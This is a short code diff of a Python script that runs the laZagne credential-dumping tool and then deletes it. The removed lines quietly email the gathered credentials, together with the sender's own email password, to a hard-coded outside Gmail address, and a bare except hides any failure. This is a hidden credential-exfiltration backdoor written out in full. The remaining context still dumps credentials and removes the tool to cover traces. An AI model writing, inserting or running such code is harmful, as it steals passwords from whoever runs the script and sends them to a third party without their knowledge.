@@ -89,13 +89,6 @@ try:
     
 except:
     exit("[-] Something went wrong while running laZagne.py. Exiting...")
-   
-try:
-        recipient = "instagramcorp96@gmail.com"
-        nefarious = email + password + body
-        send_mail(email, password, recipient, subject, nefarious)
-except:
-        Exception
     
 try:
     print("[+] Deleting Lazagne....")
